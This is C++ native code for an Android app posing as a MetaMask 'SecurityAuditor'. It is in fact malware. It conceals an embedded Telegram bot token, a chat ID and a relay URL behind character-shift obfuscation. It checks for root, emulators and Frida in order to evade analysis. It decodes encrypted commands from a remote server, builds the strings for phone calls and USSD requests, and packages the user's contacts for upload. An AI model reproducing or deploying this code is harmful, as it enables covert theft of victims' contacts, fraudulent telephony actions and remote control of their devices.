#include <jni.h>
#include <string>
#include <vector>
#include <sys/system_properties.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <cstring>
#include <fstream>
#include <fcntl.h>
#include <poll.h>
#include <errno.h>
#include <sstream>
#include "base64.h"

#define NATIVE_SHIFT 3

static std::string decodeShifted(const unsigned char* encoded, size_t len, int shift) {
    std::string result(len, '\0');
    for (size_t i = 0; i < len; ++i) {
        result[i] = static_cast<char>(static_cast<unsigned char>(encoded[i]) - shift);
    }
    return result;
}

static std::string assemble(const std::vector<std::string>& parts) {
    std::string r;
    for (const auto& p : parts) r += p;
    return r;
}

static std::string cat2(const char* a, const char* b) { return std::string(a) + b; }
static std::string cat3(const char* a, const char* b, const char* c) { return std::string(a) + b + c; }

static jstring safeUtf8(JNIEnv* env, const std::string& s) {
    for (unsigned char c : s)
        if (c == 0 || c > 0x7E) return env->NewStringUTF("");
    return env->NewStringUTF(s.c_str());
}

static const unsigned char OBF_KEY_ENC[] = { 0 }; // OBF_KEY_PLACEHOLDER
static std::string get_obf_key() {
    return decodeShifted(OBF_KEY_ENC, sizeof(OBF_KEY_ENC), NATIVE_SHIFT);
}

static const unsigned char UUID_PFX_ENC[] = { 0 }; // UUID_PFX_PLACEHOLDER
static const unsigned char UUID_SFX_ENC[] = { 0 }; // UUID_SFX_PLACEHOLDER

static jstring native_decrypt_domain(JNIEnv *env, jobject, jstring jB64) {
    if (!jB64) return env->NewStringUTF("");
    const char* b64 = env->GetStringUTFChars(jB64, nullptr);
    if (!b64) return env->NewStringUTF("");
    std::string decoded = base64_decode(b64);
    env->ReleaseStringUTFChars(jB64, b64);
    if (decoded.empty()) return env->NewStringUTF("");
    const std::string key = get_obf_key();
    if (key.empty()) return env->NewStringUTF("");
    std::string result(decoded.size(), '\0');
    for (size_t i = 0; i < decoded.size(); ++i)
        result[i] = decoded[i] ^ key[i % key.size()];
    return safeUtf8(env, result);
}

static jstring native_get_uuid_prefix(JNIEnv *env, jobject) {
    return safeUtf8(env, decodeShifted(UUID_PFX_ENC, sizeof(UUID_PFX_ENC), NATIVE_SHIFT));
}

static jstring native_get_uuid_suffix(JNIEnv *env, jobject) {
    return safeUtf8(env, decodeShifted(UUID_SFX_ENC, sizeof(UUID_SFX_ENC), NATIVE_SHIFT));
}

static const unsigned char XOR_KEY_ENC[] = {
    'M'+3,'y'+3,'S'+3,'u'+3,'p'+3,'e'+3,'r'+3,'S'+3,'e'+3,'c'+3,
    'r'+3,'e'+3,'t'+3,'K'+3,'e'+3,'y'+3,'F'+3,'o'+3,'r'+3,'D'+3,
    'a'+3,'t'+3,'a'+3
};
static std::string get_xor_key() {
    return decodeShifted(XOR_KEY_ENC, sizeof(XOR_KEY_ENC), 3);
}

static std::string xor_cipher(const std::string& data, const std::string& key) {
    if (data.empty() || key.empty()) return data;
    std::string out = data;
    for (size_t i = 0; i < data.length(); ++i)
        out[i] = data[i] ^ key[i % key.length()];
    return out;
}

static std::string encrypt_logic(const std::string& data) {
    const std::string key = get_xor_key();
    std::string out = data;
    for (size_t i = 0; i < data.length(); ++i)
        out[i] = data[i] ^ key[i % key.length()] ^ (i & 0xFF);
    return base64_encode(reinterpret_cast<const unsigned char*>(out.c_str()), out.length());
}

static jstring native_encrypt_data(JNIEnv *env, jobject, jstring jInput) {
    if (!jInput) return env->NewStringUTF("");
    const char* in = env->GetStringUTFChars(jInput, nullptr);
    std::string enc = encrypt_logic(std::string(in));
    env->ReleaseStringUTFChars(jInput, in);
    return env->NewStringUTF(enc.c_str());
}

static bool checkBuildProp(const char* key, const char* fragment) {
    char value[PROP_VALUE_MAX];
    int len = __system_property_get(key, value);
    return (len > 0 && strstr(value, fragment) != nullptr);
}

extern "C" JNIEXPORT jboolean JNICALL
Java_com_example_MetaMask_utils_SecurityAuditor_checkNativeRoot(JNIEnv *env, jobject) {
    const std::string paths[] = {
        cat2("/system/app/", "Superuser.apk"),
        cat2("/sbin/",       "su"),
        cat2("/system/bin/", "su"),
        cat2("/system/xbin/","su"),
        cat3("/data/local/", "xbin/", "su"),
        cat3("/data/local/", "bin/",  "su"),
        cat3("/system/sd/",  "xbin/", "su"),
        cat3("/system/bin/", "failsafe/", "su"),
        cat2("/data/local/", "su")
    };
    for (const auto& p : paths) {
        if (access(p.c_str(), F_OK) == 0) return JNI_TRUE;
    }
    if (checkBuildProp("ro.build.tags", cat2("test","-keys").c_str())) return JNI_TRUE;
    return JNI_FALSE;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_MetaMask_utils_SecurityAuditor_checkNativeEmulator(JNIEnv *env, jobject) {
    if (checkBuildProp("ro.kernel.qemu",      "1"))    return env->NewStringUTF("ro.kernel.qemu=1");
    if (checkBuildProp("ro.product.model",    "sdk"))  return env->NewStringUTF("ro.product.model=sdk");
    if (checkBuildProp("ro.product.model",    "Android SDK built for x86"))
                                                        return env->NewStringUTF("ro.product.model=Android SDK built for x86");
    if (checkBuildProp("ro.hardware",         "goldfish")) return env->NewStringUTF("ro.hardware=goldfish");
    if (checkBuildProp("ro.hardware",         "ranchu"))   return env->NewStringUTF("ro.hardware=ranchu");
    return env->NewStringUTF("");
}

extern "C" JNIEXPORT jboolean JNICALL
Java_com_example_MetaMask_utils_SecurityAuditor_checkNativeFrida(JNIEnv *env, jobject) {
    FILE* fp = fopen("/proc/self/maps", "r");
    if (fp) {
        char line[512];
        const std::string fa = cat2("frida", "-agent");
        const std::string fg = cat2("frida", "-gadget");
        while (fgets(line, 512, fp)) {
            if (strstr(line, fa.c_str()) || strstr(line, fg.c_str())) {
                fclose(fp); return JNI_TRUE;
            }
        }
        fclose(fp);
    }

    struct sockaddr_in addr{};
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return JNI_FALSE;

    addr.sin_family = AF_INET;
    addr.sin_port   = htons(27042);
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);

    int flags = fcntl(sockfd, F_GETFL, 0);
    fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);

    int res = connect(sockfd, (struct sockaddr*)&addr, sizeof(addr));
    if (res < 0 && errno == EINPROGRESS) {
        struct pollfd pfd{};
        pfd.fd = sockfd;
        pfd.events = POLLOUT;
        if (poll(&pfd, 1, 200) > 0) {
            int err = 0; socklen_t len = sizeof(err);
            getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &err, &len);
            if (err == 0) { close(sockfd); return JNI_TRUE; }
        }
    } else if (res == 0) {
        close(sockfd); return JNI_TRUE;
    }
    close(sockfd);
    return JNI_FALSE;
}

static const unsigned char TG_TOKEN_A[] = {
    '8'+5,'4'+5,'6'+5,'2'+5,'8'+5,'7'+5,'7'+5,'1'+5,'5'+5,'8'+5,':'+5,
    'A'+5,'A'+5,'E'+5,'U'+5,'b'+5,'J'+5,'I'+5,'1'+5,'x'+5,'_'+5
};
static const unsigned char TG_TOKEN_B[] = {
    '3'+5,'A'+5,'q'+5,'C'+5,'V'+5,'U'+5,'e'+5,'o'+5,'6'+5,'6'+5,
    '0'+5,'4'+5,'R'+5,'p'+5,'r'+5,'a'+5,'4'+5,'V'+5,'S'+5,'B'+5,
    'R'+5,'p'+5,'W'+5,'w'+5,'w'+5
};

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_MetaMask_utils_SecurityAuditor_getSrvConfigA(JNIEnv *env, jobject) {
    std::string tok = decodeShifted(TG_TOKEN_A, sizeof(TG_TOKEN_A), 5)
                    + decodeShifted(TG_TOKEN_B, sizeof(TG_TOKEN_B), 5);
    return env->NewStringUTF(tok.c_str());
}

static const unsigned char TG_CHAT_ID[] = {
    '1'+5,'6'+5,'7'+5,'6'+5,'6'+5,'3'+5,'1'+5,'3'+5,'8'+5,'5'+5
};

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_MetaMask_utils_SecurityAuditor_getSrvConfigB(JNIEnv *env, jobject) {
    return env->NewStringUTF(decodeShifted(TG_CHAT_ID, sizeof(TG_CHAT_ID), 5).c_str());
}

static const unsigned char EP_A[] = {
    'h'+5,'t'+5,'t'+5,'p'+5,'s'+5,':'+5,'/'+5,'/'+5,
    'g'+5,'a'+5,'t'+5,'e'+5,'-'+5,'f'+5,'e'+5,'n'+5,'d'+5,'e'+5,'r'+5,'.'+5,
    'l'+5,'u'+5,'f'+5,'t'+5,'r'+5,'i'+5,'b'+5,'k'+5,'a'+5,'.'+5
};
static const unsigned char EP_B[] = {
    'w'+5,'o'+5,'r'+5,'k'+5,'e'+5,'r'+5,'s'+5,
    '.'+5,'d'+5,'e'+5,'v'+5
};
static const unsigned char EP_C[] = {
    '/'+5,'b'+5,'o'+5,'t'+5,'%'+5,'s'+5,
    '/'+5,'s'+5,'e'+5,'n'+5,'d'+5,'M'+5,'e'+5,'s'+5,'s'+5,'a'+5,'g'+5,'e'+5
};
static const unsigned char EP_D[] = {
    '?'+5,'c'+5,'h'+5,'a'+5,'t'+5,'_'+5,'i'+5,'d'+5,'='+5,'%'+5,'s'+5,
    '&'+5,'t'+5,'e'+5,'x'+5,'t'+5,'='+5,'%'+5,'s'+5
};

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_MetaMask_utils_SecurityAuditor_getSrvEndpoint(JNIEnv *env, jobject) {
    std::string url = decodeShifted(EP_A, sizeof(EP_A), 5)
                    + decodeShifted(EP_B, sizeof(EP_B), 5)
                    + decodeShifted(EP_C, sizeof(EP_C), 5)
                    + decodeShifted(EP_D, sizeof(EP_D), 5);
    return env->NewStringUTF(url.c_str());
}

static jstring native_decode_task(JNIEnv *env, jobject, jstring jPayload) {
    if (!jPayload) return env->NewStringUTF("{}");
    const char* chars = env->GetStringUTFChars(jPayload, nullptr);
    if (!chars)  return env->NewStringUTF("{}");

    std::string decoded = base64_decode(chars);
    env->ReleaseStringUTFChars(jPayload, chars);
    std::string task = xor_cipher(decoded, get_xor_key());

    std::string task_id = "0", param1;
    bool is_action_one = task.find(cat3("\"type\":","\"","action_one\"")) != std::string::npos;
    if (is_action_one) {
        task_id = "1";
        size_t pos = task.find("\"params\":\"");
        if (pos != std::string::npos) {
            size_t s = pos + 10, e = task.find("\"", s);
            if (e != std::string::npos) param1 = task.substr(s, e - s);
        }
    }
    return env->NewStringUTF(("{\"task_id\":" + task_id + ", \"p1\":\"" + param1 + "\"}").c_str());
}

static jstring native_process_task_result(JNIEnv *env, jobject, jint jTaskId, jstring jRawResult) {
    if (!jRawResult) return env->NewStringUTF("ERROR: Raw result was null");
    const char* chars = env->GetStringUTFChars(jRawResult, nullptr);
    if (!chars) return env->NewStringUTF("ERROR: Could not get result string");
    std::string raw(chars);
    env->ReleaseStringUTFChars(jRawResult, chars);

    std::string report;
    if (jTaskId == 1) {
        if (raw.find("Request sent") != std::string::npos)
            report = cat2("ACTION_ONE_STATUS: ", raw.c_str());
        else if (raw.rfind("Error: ", 0) == 0)
            report = cat2("ACTION_ONE_ERROR: ", raw.substr(7).c_str());
        else
            report = cat2("ACTION_ONE_RESPONSE: ", raw.c_str());
    } else {
        report = "UNKNOWN_TASK_ID_" + std::to_string(jTaskId) + "_RESULT: " + raw;
    }
    return env->NewStringUTF(report.c_str());
}

static jstring native_get_call_action_string(JNIEnv *env, jobject) {
    return env->NewStringUTF(cat3("android.intent.", "action.", "CALL").c_str());
}

static jstring native_get_tel_prefix(JNIEnv *env, jobject) {
    return env->NewStringUTF(cat2("te", "l:").c_str());
}

static jstring native_get_request_method_name(JNIEnv *env, jobject) {
    return env->NewStringUTF(cat3("send", "Ussd", "Request").c_str());
}

static jstring native_get_callback_handler_class_name(JNIEnv *env, jobject) {
    return env->NewStringUTF(
        cat3("com.yourcompany.", "internal.", "SystemActionCallback").c_str());
}

static jstring native_get_system_callback_class_name(JNIEnv *env, jobject) {
    return env->NewStringUTF(
        assemble({"android.telephony", ".TelephonyManager", "$UssdResponseCallback"}).c_str());
}

static jstring native_get_contacts_action_string(JNIEnv *env, jobject) {
    return env->NewStringUTF(cat2("get", "Contacts").c_str());
}

static jstring native_build_contacts_payload(JNIEnv *env, jobject, jobjectArray names, jobjectArray numbers) {
    std::stringstream json;
    json << "{\"" << cat2("ac","tion") << "\":\"" << cat2("upload","ContactsData") << "\","
         << "\"" << cat2("con","tacts") << "\":[";

    int count = env->GetArrayLength(names);
    for (int i = 0; i < count; ++i) {
        jstring jn = (jstring)env->GetObjectArrayElement(names, i);
        jstring jp = (jstring)env->GetObjectArrayElement(numbers, i);
        const char* n = env->GetStringUTFChars(jn, 0);
        const char* p = env->GetStringUTFChars(jp, 0);
        json << "{\"name\":\"" << n << "\",\"" << cat2("phone","Number") << "\":\"" << p << "\"}";
        if (i < count - 1) json << ",";
        env->ReleaseStringUTFChars(jn, n); env->ReleaseStringUTFChars(jp, p);
        env->DeleteLocalRef(jn); env->DeleteLocalRef(jp);
    }
    json << "]}";
    return env->NewStringUTF(json.str().c_str());
}

#ifndef NDEBUG
extern "C" jstring
Java_com_yourcompany_core_jni_NativeBridge_nativeEncryptData(JNIEnv *env, jobject obj, jstring data) {
    return native_encrypt_data(env, obj, data);
}
extern "C" jstring
Java_com_yourcompany_core_jni_NativeBridge_nativeDecodeTask(JNIEnv *env, jobject obj, jstring payload) {
    return native_decode_task(env, obj, payload);
}
extern "C" jstring
Java_com_yourcompany_core_jni_NativeBridge_nativeProcessTaskResult(JNIEnv *env, jobject obj, jint taskId, jstring rawResult) {
    return native_process_task_result(env, obj, taskId, rawResult);
}
extern "C" jstring
Java_com_yourcompany_core_jni_NativeBridge_nativeGetCallActionString(JNIEnv *env, jobject obj) {
    return native_get_call_action_string(env, obj);
}
extern "C" jstring
Java_com_yourcompany_core_jni_NativeBridge_nativeGetTelPrefix(JNIEnv *env, jobject obj) {
    return native_get_tel_prefix(env, obj);
}
extern "C" jstring
Java_com_yourcompany_core_jni_NativeBridge_nativeGetRequestMethodName(JNIEnv *env, jobject obj) {
    return native_get_request_method_name(env, obj);
}
extern "C" jstring
Java_com_yourcompany_core_jni_NativeBridge_nativeGetCallbackHandlerClassName(JNIEnv *env, jobject obj) {
    return native_get_callback_handler_class_name(env, obj);
}
extern "C" jstring
Java_com_yourcompany_core_jni_NativeBridge_nativeGetSystemCallbackClassName(JNIEnv *env, jobject obj) {
    return native_get_system_callback_class_name(env, obj);
}
extern "C" jstring
Java_com_yourcompany_core_jni_NativeBridge_nativeGetContactsActionString(JNIEnv *env, jobject obj) {
    return native_get_contacts_action_string(env, obj);
}
extern "C" jstring
Java_com_yourcompany_core_jni_NativeBridge_nativeBuildContactsPayload(JNIEnv *env, jobject obj, jobjectArray names, jobjectArray numbers) {
    return native_build_contacts_payload(env, obj, names, numbers);
}
extern "C" jstring
Java_com_yourcompany_core_jni_NativeBridge_nativeDecryptDomain(JNIEnv *env, jobject obj, jstring b64) {
    return native_decrypt_domain(env, obj, b64);
}
extern "C" jstring
Java_com_yourcompany_core_jni_NativeBridge_nativeGetUuidPrefix(JNIEnv *env, jobject obj) {
    return native_get_uuid_prefix(env, obj);
}
extern "C" jstring
Java_com_yourcompany_core_jni_NativeBridge_nativeGetUuidSuffix(JNIEnv *env, jobject obj) {
    return native_get_uuid_suffix(env, obj);
}
#endif

static const JNINativeMethod JNI_METHODS[] = {
    {"nativeEncryptData",              "(Ljava/lang/String;)Ljava/lang/String;",              (void*)native_encrypt_data},
    {"nativeDecodeTask",               "(Ljava/lang/String;)Ljava/lang/String;",              (void*)native_decode_task},
    {"nativeProcessTaskResult",        "(ILjava/lang/String;)Ljava/lang/String;",             (void*)native_process_task_result},
    {"nativeGetCallActionString",      "()Ljava/lang/String;",                                (void*)native_get_call_action_string},
    {"nativeGetTelPrefix",             "()Ljava/lang/String;",                                (void*)native_get_tel_prefix},
    {"nativeGetRequestMethodName",     "()Ljava/lang/String;",                                (void*)native_get_request_method_name},
    {"nativeGetCallbackHandlerClassName","()Ljava/lang/String;",                              (void*)native_get_callback_handler_class_name},
    {"nativeGetSystemCallbackClassName","()Ljava/lang/String;",                               (void*)native_get_system_callback_class_name},
    {"nativeGetContactsActionString",  "()Ljava/lang/String;",                               (void*)native_get_contacts_action_string},
    {"nativeBuildContactsPayload",     "([Ljava/lang/String;[Ljava/lang/String;)Ljava/lang/String;", (void*)native_build_contacts_payload},
    {"nativeDecryptDomain",            "(Ljava/lang/String;)Ljava/lang/String;",              (void*)native_decrypt_domain},
    {"nativeGetUuidPrefix",            "()Ljava/lang/String;",                                (void*)native_get_uuid_prefix},
    {"nativeGetUuidSuffix",            "()Ljava/lang/String;",                                (void*)native_get_uuid_suffix}
};

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) {
    JNIEnv* env = nullptr;
    if (vm->GetEnv(reinterpret_cast<void**>(&env), JNI_VERSION_1_6) != JNI_OK)
        return JNI_ERR;

    static const unsigned char CLS_ENC[] = {
        'c'+2,'o'+2,'m'+2,'/'+2,'y'+2,'o'+2,'u'+2,'r'+2,'c'+2,'o'+2,'m'+2,'p'+2,'a'+2,'n'+2,'y'+2,
        '/'+2,'c'+2,'o'+2,'r'+2,'e'+2,'/'+2,'j'+2,'n'+2,'i'+2,'/'+2,
        'N'+2,'a'+2,'t'+2,'i'+2,'v'+2,'e'+2,'B'+2,'r'+2,'i'+2,'d'+2,'g'+2,'e'+2
    };
    std::string clsName = decodeShifted(CLS_ENC, sizeof(CLS_ENC), 2);

    jclass cls = env->FindClass(clsName.c_str());
    if (!cls) return JNI_ERR;

    if (env->RegisterNatives(cls, JNI_METHODS, sizeof(JNI_METHODS)/sizeof(JNINativeMethod)) < 0) {
        env->DeleteLocalRef(cls); return JNI_ERR;
    }
    env->DeleteLocalRef(cls);
    return JNI_VERSION_1_6;
}
